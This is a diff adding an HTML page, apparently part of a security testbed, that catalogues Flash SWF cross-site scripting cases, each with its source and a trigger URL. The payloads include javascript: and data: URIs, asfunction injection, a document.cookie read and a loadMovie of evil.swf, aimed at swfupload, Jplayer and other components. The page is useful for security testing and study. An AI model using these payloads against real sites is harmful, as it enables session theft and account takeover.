@@ -1,0 +1,73 @@
+<ul>
+    <li>
+        swfupload v2.2.0.1 : ExternalInterface.call()
+        <ul>
+            <li>source - https://nealpoole.com/blog/2012/05/xss-and-csrf-via-swf-applets-swfupload-plupload/</li>
+            <li>trigger - <b>files/swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//</b></li>
+        </ul>
+    </li>
+    </br>
+
+    <li>
+        Jplayer.swf : ExternalInterface.call()
+        <ul>
+            <li>source - Flash Exploitation DB</li>
+            <li>trigger - <b>files/Jplayer.swf?jQuery=confirm&id=Your%20cookies%20and%20authentication%20have%20been%20captured%20and%20an%20attacker%20now%20owns%20your%20account%20and%20all%20your%20information.%27)*confirm(document.cookie%2b'&vol=0.8&muted=false&.swf</b></li>
+        </ul>
+    </li>
+
+    </br>
+    <li>
+        redirect.swf : geturl()
+        <ul>
+            <li>source - Google</li>
+            <li>trigger - <b>files/redirect.swf?url=javascript:alert(9);</b></li>
+        </ul>
+    </li>
+ 
+    </br>
+    <li>
+        Some Ad Banner : geturl() - 1 Click
+        <ul>
+            <li>source - Google</li>
+            <li>trigger - <b>files/finnor.swf?clickTag=javascript:alert(1);</b></li>
+        </ul>
+    </li>
+
+    </br>
+    <li>
+        Vulnerable.swf : htmltextfield() - 2 Clicks
+        <ul>
+            <li>source - demo.testfire.net</li>
+            <li>trigger - <b>files/vulnerable.swf?htmlVar=%3Ca%20href%3D%22asfunction%3AgetURL%2Cjavascript%3Aalert%28%27gotcha%21%27%29%22%3E%20Click%20here%3C%2fa%3E</b></li>
+        </ul>
+    </li>
+    </br>
+    <li>
+        Vulnerable.swf : loadmovie() - Single click
+        <ul>
+            <li>source - demo.testfire.net</li>
+            <li>trigger - <b>files/vulnerable.swf?loadMovieVar=evil.swf</b></li>
+        </ul>
+    </li>
+    </br>
+    <li>
+        Pie3D.swf : Parameters from xml - Click
+        <ul>
+            <li>source - FlashExploitDB</li>
+            <li>trigger - <b>files/Pie3D.swf?dataURL=xss.xml</b></li>
+        </ul>
+    </li>
+    </br>
+    <li>
+        link_protocol_test.swf : navigateToUrl() - Only Firefox
+        <ul>
+            <li>source - https://soroush.secproject.com/blog/2013/10/catch-up-on-flash-xss-exploitation-part-2-navigatetourl-and-jar-protocol/</li>
+            <li>trigger - <b>files/link_protocol_test.swf?input=data%3Atext%2fhtml%3Btext%2C%3Cscript%3Ealert%28document.domain%29%3B%3C%2fscript%3E%2f%2f</b></li>
+        </ul>
+    </li>
+</ul>
+
+<b>Some More Sources</b>
+<p>http://web.appsec.ws/FlashExploitDatabase.php</p>
+<p>http://demo.testfire.net/vulnerable.swf</p>
